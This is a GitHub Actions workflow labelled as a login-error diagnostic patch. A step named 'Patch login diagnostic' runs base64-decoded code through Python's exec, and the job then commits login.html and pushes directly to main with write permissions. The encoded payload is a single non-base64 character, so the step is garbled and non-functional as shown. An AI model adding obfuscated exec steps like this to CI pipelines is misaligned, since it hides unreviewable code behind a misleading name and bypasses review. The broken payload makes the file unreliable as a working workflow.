name: Diagnose login error v2
on:
  push:
    paths:
      - '.github/workflows/diagnose-login-error-v2.yml'
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Patch login diagnostic
        run: python -c "import base64;exec(base64.b64decode('와'))"
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add login.html
          git commit -m "diag: show Firebase login error code"
          git push origin main
